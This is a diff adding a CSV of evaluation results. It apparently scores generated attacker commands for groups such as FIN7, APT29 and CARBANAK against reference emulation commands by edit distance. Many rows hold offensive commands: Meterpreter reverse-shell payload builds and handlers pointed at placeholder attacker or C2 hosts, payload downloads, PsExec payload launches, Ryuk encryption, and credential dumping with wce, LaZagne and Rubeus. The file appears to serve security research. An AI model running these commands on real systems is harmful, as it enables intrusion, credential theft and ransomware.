@@ -1,0 +1,379 @@
+report,file,tool,input_command,matched_command,edit_score,match_found
+AnotherVictim_FIN6,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+AnotherVictim_FIN6,command_psexec_TA0002_T1059.txt,psexec,"psexec \\target_system -accepteula -nobanner cmd /c ""notepad.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,336",True
+BITDEFENDER_CARBANAK,command_adfind_TA0007_T1083.txt,adfind,adfind -sc adobjcnt:user,"adfind -f ""(objectcategory=group)""`","0,508",True
+BITDEFENDER_CARBANAK,command_pupy_TA0001_T1078.txt,pupy,creddump -o C:\Users\adm_admin\AppData\Roaming\Microsoft\Credentials,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,511",True
+BITDEFENDER_CARBANAK,command_pupy_TA0002_T1059.txt,pupy,privesc_checker --system <windows|linux>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,26",True
+BITDEFENDER_CARBANAK,command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe purge /luid:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,"0,421",True
+BITDEFENDER_CARBANAK,command_wmic_TA0007_T1082.txt,wmic,wmic computersystem get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,426",True
+COSMIC_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -b <domain_controller> -f ""(|(name=<malicious_file_name>.jpg)(name=<malicious_file_name>.doc))"" -d ""JPEG Photo""",`adfind.exe -f (objectcategory=group) > ad_group.txt`,"0,269",True
+COSMIC_APT29,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+COSMIC_APT29,command_ryuk_TA0009_T1113.txt,ryuk,"ryuk.exe -p ""<process_name>""",`ryuk.exe --encrypt --process-name notepad.exe`,"0,613",True
+COZY2_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /node:<target_computer> /namespace:\\root\cimv2 path Win32_Process call Create,CommandLine=""calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,447",True
+COZY_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -sdpipe+ -resolvesidsgeneric -where ""(&(objectCategory=form)(name=<form_name>))""","adfind -f ""(objectcategory=group)""`","0,459",True
+COZY_APT29,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+CrashOverride_SANDWORM,command_psexec_TA0040_T1489.txt,psexec,"psexec \\remote_system -l -accepteula -nobanner cmd /c ""sc stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,293",True
+CrashOverride_SANDWORM,command_ryuk_TA0002_T1053.txt,ryuk,ryuk.exe /schtasks,`ryuk.exe --encrypt --process-name notepad.exe`,"0,369",True
+CrashOverride_SANDWORM,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /p <persist_file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,487",True
+CrashOverride_SANDWORM,command_ryuk_TA0004_T1543.txt,ryuk,ryuk.exe /target:C:\Windows\System32\services.exe,`ryuk.exe --encrypt --process-name notepad.exe`,"0,396",True
+CROWD_APT29,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
+wce.exe -w
+```","0,462",True
+CROWD_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /NAMESPACE:""root\cimv2"" /ROLE:__elah! /NODE:<computer_name> PROCESS CREATE <namespace_path>\Win32_Process.StartService","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,235",True
+CROWD_APT29,command_wmic_TA0007_T1518.txt,wmic,wmic SYSDRIVER list /format:list,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,312",True
+CROWD_CARBANAK,command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump:csv,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,"0,471",True
+CROWD_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+CROWD_CARBANAK,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -OutputPath <obfuscated_file_path> -InputFile <original_file_path>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,369",True
+CROWD_CARBANAK,command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""New-Object System.Net.WebClient).DownloadFile('http://<url>/<file>', '<local_file>')""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`","0,304",True
+CROWD_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,588",True
+CROWD_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -u <user_name> -p <password> -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,44",True
+CROWD_CARBANAK,command_plink_TA0008_T1021.txt,plink,plink.exe -no-antispoof -R 3389:localhost:3389 <victim_machine_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,455",True
+CROWD_CARBANAK,command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -u <username> -p <password> -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,357",True
+CROWD_CARBANAK,command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -h -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""copy C:\path\to\target_file.exe %appdata%\Microsoft\Windows\Downloaded Program Files""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,336",True
+CROWD_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
+CROWD_CARBANAK,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce.exe /dump /ntlm,"```sh
+wce.exe -w
+```","0,41",True
+CROWD_WIZARDSPIDER,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1035.txt,metasploit,msfpayload windows/xp/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,654",True
+CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1059.txt,metasploit,use auxiliary/scanner/smb/smb_login,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```","0,517",True
+CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1018.txt,metasploit,recon info,`sudo msfconsole`,"0,296",True
+CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1057.txt,metasploit,code_factory.make_random_stub --type if_statement,`meterpreter > migrate -N mstsc.exe `,"0,233",True
+CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1082.txt,metasploit,use powershell mixin; payload_info; osinfo,`meterpreter > load powershell`,"0,329",True
+CROWD_WIZARDSPIDER,command_metasploit_TA0011_T1071.txt,metasploit,run http://user:<pass>@<remote_IP>:5985,`meterpreter> getsystem -t 1`,"0,265",True
+CROWD_WIZARDSPIDER,command_plink_TA0011_T1105.txt,plink,"plink.exe -i <private_key_file> -ssh user@192.168.0.4 -m ""<command_to_execute>""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,478",True
+CROWD_WIZARDSPIDER,command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -u <new-user-name> -p <password> -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,32",True
+CROWD_WIZARDSPIDER,command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -e -u <new_user_name> -p <password> -w C:\directory,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,357",True
+CROWD_WIZARDSPIDER,command_psexec_TA0004_T1078.txt,psexec,psexec -u <new_user_name> -p <new_password> //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,301",True
+CROWD_WIZARDSPIDER,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Username -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,347",True
+CROWD_WIZARDSPIDER,command_psexec_TA0006_T1003.txt,psexec,"psexec -i -u <Domain\User> -p <password> cmd /c ""whoami""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,332",True
+CROWD_WIZARDSPIDER,command_psexec_TA0008_T1021.txt,psexec,"psexec @<list_of_hosts_file> -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,286",True
+CROWD_WIZARDSPIDER,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,63",True
+CROWD_WIZARDSPIDER,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --process-name <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,609",True
+CYWARE_FIN6,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+CYWARE_FIN6,command_metasploit_TA0002_T1129.txt,metasploit,"msfconsole -x ""use exploit/windows/local/payload_inject; set PAYLOAD=windows/x64/meterpreter/reverse_tcp; set LHOST=<attacker_IP>; set LPORT=<attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,559",True
+CYWARE_FIN6,command_metasploit_TA0003_T1543.txt,metasploit,"msfdb -n ""Windows_Service"" -o ""mof"" upload <mof_file>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,337",True
+CYWARE_FIN6,command_metasploit_TA0004_T1543.txt,metasploit,msfdb --component db_connect -n <name> -u your_current_account_name -p super_secret_password -t super_secret_api_token,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,268",True
+CYWARE_FIN6,command_plink_TA0011_T1105.txt,plink,plink -share <c2_server>,"```sh
+plink -ssh #{user}@#{server}
+```","0,516",True
+CYWARE_FIN6,command_psexec_TA0008_T1021.txt,psexec,psexec -s -u <remote_username> -p <password> -r <remote_service_name> -x,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,31",True
+CYWARE_FIN6,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject-lockergoga,`ryuk.exe --encrypt --process-name notepad.exe`,"0,533",True
+CYWARE_OILRIG,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+CYWARE_OILRIG,command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/http,`meterpreter> getsystem -t 1`,"0,531",True
+CYWARE_OILRIG,command_paexec_TA0003_T1505.txt,paexec,paexec -i -c <web_server_script_name>.bat," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,207",True
+CYWARE_OILRIG,command_plink_TA0001_T1071.txt,plink,plink.exe -share <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,416",True
+CYWARE_OILRIG,command_pupy_TA0001_T1078.txt,pupy,creddump,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,104",True
+CYWARE_OILRIG,command_pupy_TA0003_T1078.txt,pupy,run Lazagne,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,135",True
+CYWARE_OILRIG,command_pupy_TA0004_T1078.txt,pupy,lazagne -o db -p <local_db_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,228",True
+CYWARE_OILRIG,command_pupy_TA0005_T1078.txt,pupy,laze -s,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,118",True
+DEEPWATCH_FIN7,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -s <username>:<domain>:<hash>[:<ntlm_hash>],"```sh
+wce.exe -w
+```","0,149",True
+DIVE_WIZARDSPIDER,command_chrome_passwords_TA0003_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,371",True
+DIVE_WIZARDSPIDER,command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,371",True
+DIVE_WIZARDSPIDER,command_ryuk_TA0002_T1059.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
+DIVE_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
+wce.exe -w
+```","0,462",True
+DOJ_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -no-antispoof <attacker_ssh_user>@<command_and_control_server_IP>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,411",True
+DOJ_FIN7,command_pupy_TA0001_T1078.txt,pupy,lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,105",True
+DOJ_FIN7,command_pupy_TA0003_T1078.txt,pupy,hashmon -m <process_memory_path>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,236",True
+DOJ_FIN7,command_pupy_TA0004_T1078.txt,pupy,lazagne --all,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,135",True
+DOJ_FIN7,command_pupy_TA0005_T1078.txt,pupy,loot_memory -b <browser_name>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,299",True
+DOJ_FIN7,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce -n MYDOMAIN -u NETWORK SERVICE -p WORKGROUP,"```sh
+wce.exe -w
+```","0,149",True
+DUKES_APT29,command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -ExecutionPolicy Bypass -File <script_file_path>,`meterpreter > powershell_execute Get-NetComputer`,"0,336",True
+DUKES_APT29,command_metasploit_TA0010_T1041.txt,metasploit,recon/gather/credentials collect_creds,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"0,544",True
+DUKES_APT29,command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_https; set RHOST <c2_server_ip>; set RPORT 8443; set SSL true; exploit',"```
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_https
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+    ```","0,542",True
+DUKES_APT29,command_metasploit_TA0011_T1102.txt,metasploit,curl -o <served_payload_file> https://<c2_server>/linux/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,44",True
+DUKES_APT29,command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -d","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,23",True
+DUKES_APT29,command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -u <username> -p <password> cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,359",True
+FIREEYE1_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+FIREEYE1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+FIREEYE1_CARBANAK,command_paexec_TA0002_T1204.txt,paexec,"PAExec -program ""<malicious_file_path>"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,198",True
+FIREEYE1_CARBANAK,command_paexec_TA0011_T1021.txt,paexec,paeexec -c -u <victims_username> -p <attacker_password> -w %windir% -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,384",True
+FIREEYE1_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paexec.exe -s -u <user_name> -p <password> -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,416",True
+FIREEYE1_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,'ryuk.exe --process-name notepad.exe',`ryuk.exe --encrypt --process-name notepad.exe`,"0,833",True
+FIREEYE1_CARBANAK,command_ryuk_TA0006_T1055.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"0,554",True
+FIREEYE1_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture-desktop,`ryuk.exe --encrypt --process-name notepad.exe`,"0,472",True
+FIREEYE1_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> <c2_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,589",True
+FIREEYE2_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind -jsd xxx -ntsecuritydescriptor -sddl++ -resolvesids <LNK_file_path>,`adfind.exe -f (objectcategory=group) > ad_group.txt`,"0,331",True
+FIREEYE3_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+FIREEYE3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -InputFile <image_file> -OutputFile <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,4",True
+FIREEYE3_FIN7,command_metasploit_TA0002_T1059.txt,metasploit,"msfconsole -q; irb; require 'msf/core/exploitation'; require 'msf/util/powershell'; js = ::Rex::Exploitation::JSObfu.new %Q|eval('eval(String.fromCharCode(98,111,100));');|; js.obfuscate",`meterpreter > powershell_execute Get-NetComputer`,"0,246",True
+FIREEYE4_FIN7,command_chrome_passwords_TA0006_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+FIREEYE4_FIN7,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
+FIREEYE4_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Command:,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,091",True
+FIREEYE4_FIN7,command_plink_TA0008_T1021.txt,plink,plink.exe -load sessname -X -v -R <vnc_port>:localhost:<vnc_port> <attacker_ssh_user>@<target_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,45",True
+FIREEYE4_FIN7,command_rubeus_TA0009_T1113.txt,rubeus,rubeus logonsession /screenshot,`rubeus.exe kerberoast /domain:oz.local`,"0,282",True
+FIREEYE4_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe /inject <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,565",True
+FIREEYE4_FIN7,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,658",True
+FIREEYE5_FIN7,command_adfind_TA0003_T1546.txt,adfind,"adfind -sc adobjcnt:fsp -base CN=Foreign Security Principals,CN=Schema,CN=Configuration","adfind -f ""(objectcategory=group)""`","0,344",True
+FIREEYE5_FIN7,command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -ds -showdel",`adfind.exe -f (objectcategory=person) > ad_users.txt`,"0,293",True
+FIREEYE5_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -c > shim_database_file.sdb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,381",True
+FIREEYE5_FIN7,command_invoke_psimage_TA0002_T1106.txt,invoke psimage,Invoke-PSImage -ScriptBlock {RtlDecompressBuffer} -OutputFile,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,525",True
+FIREEYE5_FIN7,command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -Image <existing_image_file>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,511",True
+FIREEYE5_FIN7,command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Invoke-PSImage -Script .\T1543.ps1 -Out .\system-process.ps1 -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,579",True
+FIREEYE5_FIN7,command_pupy_TA0004_T1055.txt,pupy,gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,617",True
+FIREEYE5_FIN7,command_pupy_TA0005_T1055.txt,pupy,gen -f dll connect --host <target_ip>:<port> -t <transport>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,4",True
+FIREEYE6_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+FIREEYE6_FIN7,command_invoke_psimage_TA0003_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.exe -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,566",True
+FIREEYE6_FIN7,command_invoke_psimage_TA0004_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.png -Image .\kiwi.jpg -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,682",True
+FIREEYE6_FIN7,command_wmic_TA0007_T1057.txt,wmic,wmic path win32_process get name,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,417",True
+FIREEYE6_FIN7,command_wmic_TA0009_T1018.txt,wmic,"wmic path win32_process get processid, name, executablepath /value","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,431",True
+FIREEYE6_FIN7,command_wmic_TA0009_T1082.txt,wmic,"wmic path win32_process get name,processid,caption /format:value","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,375",True
+FORCEPOINT_CARBANAK,command_chrome_passwords_TA0011_T1102.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+FORCEPOINT_CARBANAK,command_plink_TA0002_T1071.txt,plink,"plink.exe -load mysession -o ""POST /path/to/web/protocol"" -v",`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,34",True
+FORCEPOINT_CARBANAK,command_plink_TA0011_T1071.txt,plink,"plink.exe login.example.com -l fred -v ""POST / HTTP/1.1"" -batch",`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,349",True
+FORCEPOINT_CARBANAK,command_plink_TA0011_T1105.txt,plink,plink -batch -ssh ggldr@<google_service_url>,"```sh
+plink -ssh #{user}@#{server}
+```","0,463",True
+FORK_APT29,command_chrome_passwords_TA0009_T1114.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_user_data>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,333",True
+FORK_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -Embed -InputFile ""<obfuscated_script.png>"" -OutputFile ""<output.png>""",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,4",True
+FORK_APT29,command_metasploit_TA0011_T1102.txt,metasploit,msfconsole -r <task_database_file>,`sudo msfconsole`,"0,392",True
+FORK_APT29,command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,404",True
+FORK_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -telnet <CnC_Server_IP> -P <port_number>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,375",True
+FORK_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<CnC_Server_IP> -s -u <username> -v <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`","0,296",True
+FORK_APT29,command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe kill,`rubeus.exe kerberoast /domain:oz.local`,"0,545",True
+FORK_APT29,command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe klist /service:krbtgt,`rubeus.exe kerberoast /domain:oz.local`,"0,5",True
+FORTINET_OILRIG,command_ryuk_TA0002_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
+FORTINET_OILRIG,command_wmic_TA0002_T1047.txt,wmic,wmic /node:<c2_server_ip> /namespace:\\root\cimv2 path Win32_PingResult call Ping,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,29",True
+GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
+GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords.exe -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,5",True
+GIGAMON1_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -ScriptData ""base64:<part1_base64_encoded_string_here>"" -OutputFile <image_file_1>.png",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,453",True
